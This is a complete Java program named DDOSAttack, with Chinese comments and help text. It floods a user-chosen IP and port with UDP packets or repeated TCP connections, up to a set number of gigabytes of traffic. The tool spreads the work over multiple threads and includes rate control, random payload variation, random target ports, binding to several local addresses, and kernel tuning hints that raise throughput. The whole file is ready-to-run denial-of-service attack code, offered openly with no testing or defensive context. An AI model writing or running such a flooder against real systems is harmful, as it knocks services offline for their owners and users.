import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.DatagramChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.LongAdder;

public class DDOSAttack {

    // ---------- 共享统计 ----------
    private static final LongAdder totalSent = new LongAdder();
    private static final LongAdder totalBytes = new LongAdder();
    private static final LongAdder totalDropped = new LongAdder();
    private static volatile boolean stopFlag = false;

    // ---------- 错误计数 ----------
    private static final LongAdder errBind = new LongAdder();
    private static final LongAdder errPortUnreachable = new LongAdder();
    private static final LongAdder errIOException = new LongAdder();
    private static final LongAdder errOther = new LongAdder();

    // ---------- 错误日志限流器 ----------
    private static final int ERR_LOG_PER_SEC = 5;
    private static final int ERR_HISTORY_MAX = 10;
    private static final Deque<String> recentErrors = new ConcurrentLinkedDeque<>();
    private static final ErrorRateLimiter errorLimiter = new ErrorRateLimiter(ERR_LOG_PER_SEC);

    // ---------- 配置 ----------
    private static String targetIP;
    private static int targetPort;
    private static long totalPackets;
    private static int packetSize = 1490;
    private static int numThreads = 4;
    private static int burstSize = 50;
    private static double rateLimit = 0.0;
    private static int duration = 0;
    private static int srcPortBase = -1;
    private static boolean randomTargetPort = false;
    private static boolean bindLocal = false;
    private static boolean varyPayload = true;
    private static boolean useTcp = false;
    private static String logFile = null;
    private static int maxRetries = 3;

    private static PrintWriter logWriter = null;
    private static InetSocketAddress[] portAddresses;
    private static List<InetAddress> localAddresses = new ArrayList<>();

    // ===================================================================
    // 内部辅助类
    // ===================================================================

    /** 令牌桶：用于精确长期速率控制 + 允许短时突发。 */
    static class TokenBucket {
        private final double capacity;
        private final double refillPerSec;
        private double tokens;
        private long lastRefillNs;

        TokenBucket(double capacity, double refillPerSec) {
            this.capacity = capacity;
            this.refillPerSec = refillPerSec;
            this.tokens = capacity;
            this.lastRefillNs = System.nanoTime();
        }

        private void refill() {
            long now = System.nanoTime();
            double elapsed = (now - lastRefillNs) / 1e9;
            if (elapsed > 0) {
                tokens = Math.min(capacity, tokens + elapsed * refillPerSec);
                lastRefillNs = now;
            }
        }

        /** 令牌充足返回 0；否则返回需要等待的纳秒数。 */
        synchronized long nanosToWait(int need) {
            refill();
            if (tokens >= need) {
                tokens -= need;
                return 0;
            }
            double missing = need - tokens;
            return (long) ((missing / refillPerSec) * 1e9);
        }
    }

    /** 令牌桶式错误限流器，避免日志刷屏。 */
    static class ErrorRateLimiter {
        private final int maxPerSec;
        private long windowStart;
        private int count;
        private long suppressed;

        ErrorRateLimiter(int maxPerSec) {
            this.maxPerSec = maxPerSec;
            this.windowStart = System.currentTimeMillis();
        }

        synchronized boolean allow() {
            long now = System.currentTimeMillis();
            if (now - windowStart > 1000) {
                windowStart = now;
                count = 0;
            }
            if (count < maxPerSec) {
                count++;
                return true;
            }
            suppressed++;
            return false;
        }

        synchronized long suppressed() { return suppressed; }
    }

    // ===================================================================
    // 主函数
    // ===================================================================
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            printUsage();
            System.exit(0);
        }
        parseArgs(args);

        if (logFile != null) {
            try {
                logWriter = new PrintWriter(new FileWriter(logFile, true));
            } catch (IOException e) {
                System.err.println("[!] 无法打开日志文件: " + e.getMessage());
            }
        }

        try {
            InetAddress.getByName(targetIP);
        } catch (UnknownHostException e) {
            System.err.println("[!] 无效的目标 IP: " + targetIP);
            System.exit(1);
        }
        if (targetPort < 1 || targetPort > 65535) {
            System.err.println("[!] 端口超出范围: " + targetPort);
            System.exit(1);
        }
        if (packetSize < 64) packetSize = 64;
        if (packetSize > 65000) packetSize = 65000;
        if (totalPackets <= 0) {
            System.err.println("[!] 总包数必须 > 0");
            System.exit(1);
        }

        if (randomTargetPort && !useTcp) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(targetIP, i);
            }
        }

        if (bindLocal) {
            enumerateLocalAddresses();
            if (localAddresses.isEmpty()) {
                System.err.println("[!] 未找到可用本地地址，已禁用 --bind-local。");
                bindLocal = false;
            } else {
                System.out.printf("[+] --bind-local 已启用，可用本地地址 %d 个。%n",
                        localAddresses.size());
            }
        }

        printKernelTuningHints();

        System.out.printf("[+] target=%s:%d  proto=%s  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%s%n",
                targetIP, targetPort, useTcp ? "TCP" : "UDP",
                (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
                totalPackets, numThreads, packetSize,
                randomTargetPort ? "  random-port" : "",
                varyPayload ? "  vary" : "");
        if (bindLocal) {
            System.out.println("[+] 每线程绑定不同本地源 IP（Java 无法伪造源 IP）");
        }
        if (rateLimit > 0) {
            System.out.printf("[+] 令牌桶速率：目标 ≈ %.0f pps%n",
                    burstSize / rateLimit);
        }
        System.out.println("[+] 攻击中... (Ctrl+C 停止)");

        Runtime.getRuntime().addShutdownHook(new Thread(() -> stopFlag = true));

        long startTime = System.currentTimeMillis();
        if (useTcp) {
            startTcpAttack();
        } else {
            startUdpAttack();
        }
        long elapsed = System.currentTimeMillis() - startTime;

        long finalSent = totalSent.longValue();
        long finalBytes = totalBytes.longValue();
        long finalDropped = totalDropped.longValue();
        double rate = elapsed > 0 ? finalSent / (elapsed / 1000.0) : 0;

        System.out.printf("%n[=] 完成: 发送 %d 包, 丢弃 %d, %.4f GB, %.2fs, %.1f pps%n",
                finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
                elapsed / 1000.0, rate);
        System.out.printf("[=] 错误: bind=%d  端口不可达=%d  IO=%d  其他=%d  (已抑制=%d)%n",
                errBind.longValue(), errPortUnreachable.longValue(),
                errIOException.longValue(), errOther.longValue(),
                errorLimiter.suppressed());
        if (!recentErrors.isEmpty()) {
            System.out.println("[=] 最近错误：");
            for (String e : recentErrors) {
                System.out.println("    " + e);
            }
        }

        if (logWriter != null) {
            logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
                    finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
            logWriter.close();
        }
    }

    // ===================================================================
    // 内核调优提示
    // ===================================================================
    private static void printKernelTuningHints() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("linux")) {
            System.out.println("[+] Linux 内核调优建议（在本机执行，需要 root）：");
            System.out.println("    sysctl -w net.core.wmem_max=8388608 net.core.rmem_max=8388608");
            System.out.println("    sysctl -w net.ipv4.udp_mem='65536 131072 262144'");
            System.out.println("    ulimit -n 65535");
        }
    }

    // ===================================================================
    // 帮助
    // ===================================================================
    private static void printUsage() {
        System.out.println("[+] 用法: java DDOSAttack -t <IP> -p <PORT> -g <GB> [选项]");
        System.out.println();
        System.out.println("[+] 必填参数：");
        System.out.println("  -t, --target        目标 IP");
        System.out.println("  -p, --port          目标端口");
        System.out.println("  -g, --gb            总流量（GB）");
        System.out.println();
        System.out.println("[+] 可选参数：");
        System.out.println("  -P, --processes     线程数（默认 4）");
        System.out.println("  -b, --burst         每突发包数（默认 50）");
        System.out.println("  -r, --rate          每突发秒数（默认 0 = 不限速）");
        System.out.println("                      由令牌桶强制，长期速率 = burstSize/rate pps。");
        System.out.println("  -d, --duration      持续时间（秒，默认 0 = 直到发完）");
        System.out.println("  -s, --src-port      源端口基数（默认 -1 = 随机）");
        System.out.println("  --size              基础包大小（默认 1490）");
        System.out.println("  --random-port       随机目标端口（仅 UDP）");
        System.out.println("  --bind-local        每个线程绑定不同的本地网卡 IP");
        System.out.println("  --tcp               使用完整 TCP 连接（不是 SYN 洪泛）");
        System.out.println("  --vary / --no-vary  启用/关闭 payload 变异（默认：启用）");
        System.out.println("  --log <file>        日志文件路径");
        System.out.println("  --max-retries       每包最大发送重试次数（默认 3）");
        System.out.println("  -h, --help          显示本帮助");
    }

    // ===================================================================
    // 参数解析
    // ===================================================================
    private static void parseArgs(String[] args) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            if (args[i].startsWith("-")) {
                if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
                    params.put(args[i], args[i + 1]);
                    i++;
                } else {
                    params.put(args[i], "true");
                }
            }
        }

        if (params.containsKey("-h") || params.containsKey("--help")) {
            printUsage();
            System.exit(0);
        }

        targetIP = params.getOrDefault("-t", params.get("--target"));
        if (targetIP == null) { System.err.println("[!] 缺少 -t/--target"); System.exit(1); }

        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr == null) { System.err.println("[!] 缺少 -p/--port"); System.exit(1); }
        targetPort = Integer.parseInt(portStr);

        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr == null) { System.err.println("[!] 缺少 -g/--gb"); System.exit(1); }
        double gb = Double.parseDouble(gbStr);

        if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
        if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
        if (params.containsKey("-b")) burstSize = Integer.parseInt(params.get("-b"));
        if (params.containsKey("-r")) rateLimit = Double.parseDouble(params.get("-r"));
        if (params.containsKey("-d")) duration = Integer.parseInt(params.get("-d"));
        if (params.containsKey("-s")) srcPortBase = Integer.parseInt(params.get("-s"));
        if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
        if (params.containsKey("--random-port")) randomTargetPort = true;
        if (params.containsKey("--bind-local")) bindLocal = true;
        if (params.containsKey("--tcp")) useTcp = true;
        if (params.containsKey("--no-vary")) varyPayload = false;
        if (params.containsKey("--vary")) varyPayload = true;
        if (params.containsKey("--log")) logFile = params.get("--log");
        if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));

        if (gb <= 0) { System.err.println("[!] GB 必须 > 0"); System.exit(1); }
        totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
        if (totalPackets <= 0) { System.err.println("[!] 流量太小"); System.exit(1); }
    }

    // ===================================================================
    // 本地地址枚举
    // ===================================================================
    private static void enumerateLocalAddresses() {
        try {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            if (ifaces == null) return;
            for (NetworkInterface iface : Collections.list(ifaces)) {
                if (!iface.isUp() || iface.isLoopback()) continue;
                for (InterfaceAddress ia : iface.getInterfaceAddresses()) {
                    InetAddress addr = ia.getAddress();
                    if (addr instanceof Inet4Address) {
                        localAddresses.add(addr);
                    }
                }
            }
        } catch (SocketException e) {
            System.err.println("[!] 枚举网卡失败: " + e.getMessage());
        }
    }

    // ===================================================================
    // 错误记录（限流）
    // ===================================================================
    private static void recordError(String msg) {
        if (!errorLimiter.allow()) return;
        recentErrors.addLast(msg);
        while (recentErrors.size() > ERR_HISTORY_MAX) {
            recentErrors.pollFirst();
        }
    }

    // ===================================================================
    // Payload 池（DirectByteBuffer）
    // ===================================================================
    private static List<ByteBuffer> buildDirectPayloadPool(int baseSize, int poolSize) {
        Random rnd = new Random();
        int delta = varyPayload ? Math.max(1, baseSize / 10) : 0;
        List<ByteBuffer> pool = new ArrayList<>(poolSize);
        for (int i = 0; i < poolSize; i++) {
            int len = baseSize - delta + (delta > 0 ? rnd.nextInt(delta * 2 + 1) : 0);
            if (len < 64) len = 64;
            if (len > 65000) len = 65000;

            ByteBuffer buf = ByteBuffer.allocateDirect(len);
            byte[] tmp = new byte[len];
            rnd.nextBytes(tmp);
            buf.put(tmp);
            buf.flip();
            pool.add(buf);
        }
        return pool;
    }

    // ===================================================================
    // UDP 攻击（主路径）—— 已修复：精确包数，增量统计
    // ===================================================================
    private static void startUdpAttack() throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        final int poolSize = 512;

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                String tag = "T" + threadId;
                ThreadLocalRandom rnd = ThreadLocalRandom.current();
                List<ByteBuffer> pool = buildDirectPayloadPool(packetSize, poolSize);

                DatagramChannel channel = null;
                TokenBucket bucket = null;
                if (rateLimit > 0) {
                    bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
                }

                int consecutiveFailures = 0;

                try {
                    channel = openUdpChannelForThread(threadId);
                    InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);

                    // 注意：sent/bytesSent/dropped 是累计计数器，绝不清零。
                    // 每次只上报自上次刷新以来的增量。
                    long sent = 0, bytesSent = 0, dropped = 0;
                    long lastReportedSent = 0, lastReportedBytes = 0, lastReportedDropped = 0;
                    long packetCounter = 0;

                    while (!stopFlag && sent < pktCount) {
                        int toSend = (int) Math.min(burstSize, pktCount - sent);

                        if (bucket != null) {
                            long waitNs = bucket.nanosToWait(toSend);
                            if (waitNs > 0) {
                                TimeUnit.NANOSECONDS.sleep(waitNs);
                            }
                        }

                        for (int j = 0; j < toSend; j++) {
                            if (stopFlag || sent >= pktCount) break;

                            ByteBuffer buf = pool.get((int) (packetCounter % pool.size()));
                            int limit = buf.limit();
                            if (limit < 8) continue;

                            // 将最后 8 字节覆盖为计数器
                            long c = packetCounter;
                            for (int b = 0; b < 8; b++) {
                                buf.put(limit - 1 - b, (byte) (c & 0xFF));
                                c >>>= 8;
                            }
                            // 前部附近 16 字节 XOR 随机翻转
                            if (varyPayload && limit >= 24) {
                                int base = 4;
                                for (int b = 0; b < 16; b++) {
                                    int idx = base + b;
                                    byte v = buf.get(idx);
                                    buf.put(idx, (byte) (v ^ (byte) rnd.nextInt(256)));
                                }
                            }
                            packetCounter++;

                            InetSocketAddress targetAddr;
                            if (randomTargetPort) {
                                int port = rnd.nextInt(1, 65536);
                                targetAddr = portAddresses[port];
                            } else {
                                targetAddr = dest;
                            }

                            boolean ok = sendUdpWithRetry(channel, buf, targetAddr, tag);
                            if (ok) {
                                sent++;
                                bytesSent += limit;
                                consecutiveFailures = 0;
                            } else {
                                dropped++;
                                consecutiveFailures++;
                                if (consecutiveFailures >= 3) {
                                    long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
                                    Thread.sleep(backoffMs);
                                    if (channel == null || !channel.isOpen()) {
                                        try { channel = openUdpChannelForThread(threadId); } catch (Exception ignore) {}
                                    }
                                }
                            }
                        }

                        // 增量刷新：只加差值，不重置 sent
                        long dSent = sent - lastReportedSent;
                        long dBytes = bytesSent - lastReportedBytes;
                        long dDropped = dropped - lastReportedDropped;
                        if (dSent > 0) totalSent.add(dSent);
                        if (dBytes > 0) totalBytes.add(dBytes);
                        if (dDropped > 0) totalDropped.add(dDropped);
                        lastReportedSent = sent;
                        lastReportedBytes = bytesSent;
                        lastReportedDropped = dropped;
                    }

                    // 循环退出后最后一次刷新（防止漏报）
                    long dSent = sent - lastReportedSent;
                    long dBytes = bytesSent - lastReportedBytes;
                    long dDropped = dropped - lastReportedDropped;
                    if (dSent > 0) totalSent.add(dSent);
                    if (dBytes > 0) totalBytes.add(dBytes);
                    if (dDropped > 0) totalDropped.add(dDropped);

                } catch (Exception e) {
                    errOther.increment();
                    recordError(tag + " 致命错误: " + e.getClass().getSimpleName()
                            + " (" + e.getMessage() + ")");
                } finally {
                    if (channel != null) {
                        try { channel.close(); } catch (IOException ignored) { }
                    }
                }
            };
            futures.add(executor.submit(task));
        }

        waitWithProgress(executor, futures);
    }

    // ===================================================================
    // TCP 攻击（connect 洪泛；不是 SYN 洪泛）—— 已修复：精确包数
    // ===================================================================
    private static void startTcpAttack() throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        final int connectTimeoutMs = 1000;
        final int socketTimeoutMs = 500;

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                String tag = "T" + threadId;
                InetAddress bindAddr = null;
                if (bindLocal && !localAddresses.isEmpty()) {
                    bindAddr = localAddresses.get(threadId % localAddresses.size());
                }

                // 累计计数器，永不清零
                long sent = 0, bytesSent = 0, dropped = 0;
                long lastReportedSent = 0, lastReportedBytes = 0, lastReportedDropped = 0;
                int consecutiveFailures = 0;
                byte[] payload = new byte[Math.min(64, packetSize)];
                new Random().nextBytes(payload);

                TokenBucket bucket = null;
                if (rateLimit > 0) {
                    bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
                }

                while (!stopFlag && sent < pktCount) {
                    int toSend = (int) Math.min(burstSize, pktCount - sent);

                    if (bucket != null) {
                        long waitNs = bucket.nanosToWait(toSend);
                        if (waitNs > 0) {
                            try { TimeUnit.NANOSECONDS.sleep(waitNs); } catch (InterruptedException ignored) {}
                        }
                    }

                    for (int j = 0; j < toSend; j++) {
                        if (stopFlag || sent >= pktCount) break;

                        try (Socket s = new Socket()) {
                            if (bindAddr != null) s.bind(new InetSocketAddress(bindAddr, 0));
                            s.setSoTimeout(socketTimeoutMs);
                            s.connect(new InetSocketAddress(targetIP, targetPort), connectTimeoutMs);
                            OutputStream os = s.getOutputStream();
                            os.write(payload);
                            os.flush();
                            sent++;
                            bytesSent += payload.length;
                            consecutiveFailures = 0;
                        } catch (PortUnreachableException e) {
                            errPortUnreachable.increment();
                            dropped++;
                            consecutiveFailures++;
                        } catch (IOException e) {
                            errIOException.increment();
                            dropped++;
                            consecutiveFailures++;
                        }

                        if (consecutiveFailures >= 3) {
                            long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
                            try { Thread.sleep(backoffMs); } catch (InterruptedException ignored) {}
                            if (consecutiveFailures > 6) {
                                recordError(tag + ": 连续失败过多，退避 " + backoffMs + "ms");
                            }
                        }
                    }

                    // 增量刷新
                    long dSent = sent - lastReportedSent;
                    long dBytes = bytesSent - lastReportedBytes;
                    long dDropped = dropped - lastReportedDropped;
                    if (dSent > 0) totalSent.add(dSent);
                    if (dBytes > 0) totalBytes.add(dBytes);
                    if (dDropped > 0) totalDropped.add(dDropped);
                    lastReportedSent = sent;
                    lastReportedBytes = bytesSent;
                    lastReportedDropped = dropped;
                }

                // 最终刷新
                long dSent = sent - lastReportedSent;
                long dBytes = bytesSent - lastReportedBytes;
                long dDropped = dropped - lastReportedDropped;
                if (dSent > 0) totalSent.add(dSent);
                if (dBytes > 0) totalBytes.add(dBytes);
                if (dDropped > 0) totalDropped.add(dDropped);
            };
            futures.add(executor.submit(task));
        }

        waitWithProgress(executor, futures);
    }

    // ===================================================================
    // 进度监控 + 优雅关闭
    // ===================================================================
    private static void waitWithProgress(ExecutorService executor, List<Future<?>> futures) throws Exception {
        long start = System.currentTimeMillis();
        long lastReportTime = start;
        long lastReportSent = 0;

        while (!stopFlag) {
            long now = System.currentTimeMillis();
            long elapsed = now - start;
            long sent = totalSent.longValue();
            long bytes = totalBytes.longValue();
            long dropped = totalDropped.longValue();

            if (sent >= totalPackets) break;
            if (duration > 0 && elapsed / 1000 >= duration) {
                stopFlag = true;
                break;
            }

            if (now - lastReportTime >= 1000) {
                long deltaSent = sent - lastReportSent;
                double deltaTime = (now - lastReportTime) / 1000.0;
                double instantRate = deltaSent / deltaTime;
                double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                double dataGB = bytes / (1024.0 * 1024 * 1024);
                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d  err_suppressed=%d%n",
                        sent, dataGB, rate, instantRate, dropped, errorLimiter.suppressed());
                if (logWriter != null) {
                    logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
                            sent, dataGB, rate, dropped);
                    logWriter.flush();
                }
                lastReportTime = now;
                lastReportSent = sent;
            }

            Thread.sleep(100);
        }

        stopFlag = true;
        for (Future<?> f : futures) {
            try { f.get(); } catch (Exception ignored) { }
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }

    // ===================================================================
    // UDP 带重试发送
    // ===================================================================
    private static boolean sendUdpWithRetry(DatagramChannel channel, ByteBuffer buf,
                                            SocketAddress target, String tag) {
        int attempts = 0;
        while (attempts < maxRetries) {
            try {
                buf.clear();
                int written = channel.send(buf, target);
                if (written > 0) return true;
            } catch (PortUnreachableException e) {
                errPortUnreachable.increment();
                recordError(tag + ": 端口不可达 (" + target + ")");
            } catch (IOException e) {
                errIOException.increment();
                recordError(tag + ": IOException (" + e.getMessage() + ")");
            } catch (Exception e) {
                errOther.increment();
                recordError(tag + ": " + e.getClass().getSimpleName() + " (" + e.getMessage() + ")");
            }
            attempts++;
        }
        return false;
    }

    // ===================================================================
    // UDP 通道工厂
    // ===================================================================
    private static DatagramChannel openUdpChannelForThread(int threadId) throws IOException {
        DatagramChannel channel = DatagramChannel.open();
        channel.configureBlocking(true);

        DatagramSocket socket = channel.socket();
        try {
            socket.setReuseAddress(true);
            try {
                socket.setSendBufferSize(4 * 1024 * 1024);
            } catch (SocketException ignored) { }
        } catch (SocketException ignored) { }

        InetAddress bindAddr = null;
        int bindPort = 0;

        if (bindLocal && !localAddresses.isEmpty()) {
            bindAddr = localAddresses.get(threadId % localAddresses.size());
        }
        if (srcPortBase >= 0) {
            bindPort = srcPortBase + threadId;
        }

        if (bindAddr != null || bindPort > 0) {
            try {
                socket.bind(new InetSocketAddress(
                        bindAddr != null ? bindAddr : InetAddress.getByName("0.0.0.0"),
                        bindPort));
            } catch (BindException e) {
                errBind.increment();
                recordError("T" + threadId + ": bind 失败 ("
                        + (bindAddr != null ? bindAddr : "0.0.0.0") + ":" + bindPort
                        + ")，改用系统分配端口");
            }
        }

        return channel;
    }
}
